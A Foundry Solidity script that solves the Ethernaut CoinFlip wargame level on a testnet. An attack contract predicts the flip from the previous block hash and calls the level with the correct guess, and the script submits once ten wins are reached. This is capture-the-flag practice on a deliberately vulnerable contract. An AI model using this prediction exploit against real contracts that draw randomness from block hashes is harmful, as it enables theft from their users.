// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";
import {ILevel} from "../../src/interfaces/ILevel.sol";
import {CoinFlip} from "ethernaut/contracts/src/levels/CoinFlip.sol";
import {Helpers} from "../Helpers.s.sol";

contract Attack {
    function DisplayResult(bool guess, bool result) public view {
        console.log("Attack Contract Deployed at:",address(this));
        console.log("Block Number:", block.number);
        console.log("(Block Number) - 1:", block.number - 1);
        console.log("Block uint hash:", uint256(blockhash(block.number - 1)));
        console.log("Guess Sent:", guess);

        if(result == true) {
            console.log("Guess was right!\n");
            // console.log("Win Count:", coinFlipInstance.consecutiveWins());
        } else {
            console.log("Guess was wrong!\n");            
        }
    }

    function getFlipResult() public view returns (bool side) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

        uint256 coinFlip = blockValue / FACTOR;
        side = coinFlip == 1 ? true : false;

        return side;
    }

    constructor(CoinFlip coinFlipInstance) {
        DisplayResult(getFlipResult(), coinFlipInstance.flip(getFlipResult()));
    }
}

contract CoinFlipSolution is Script, Helpers {
    uint pvtKey;
    address myAddr;
    uint myBalance;
    address deployedInstanceByEthernaut;

    

    function run() public {
        pvtKey = vm.envUint("METAMASK_PRIVATE_KEY");
        myAddr = vm.addr(pvtKey);
        myBalance = myAddr.balance;
        console.log("My Address:",myAddr);
        console.log("My Balance:",myBalance);

        ILevel level = ILevel(0xA62fE5344FE62AdC1F356447B669E9E6D10abaaF); // the supplied address is of factory contract on sepolia eth
        
        vm.startBroadcast(pvtKey);
        
        deployedInstanceByEthernaut = createInstance(myAddr, level);
        CoinFlip coinFlipInstance = CoinFlip(payable(deployedInstanceByEthernaut));


        // solving the chall
        
        console.log("\n====================SOLUTION STARTS====================");

        new Attack(coinFlipInstance);


        console.log("====================SOLUTION ENDS====================\n");        

        // submitting on ethernaut
        if(coinFlipInstance.consecutiveWins() == 10) {
            submitInstance(deployedInstanceByEthernaut);
        } else {
            console.log("Number of consecutive wins:",coinFlipInstance.consecutiveWins());
            console.log("Chall not submitted yet");
            console.log("Remember to run me 10 times!!! -_-");
        }

        getStats(myAddr);

        vm.stopBroadcast();
    }
}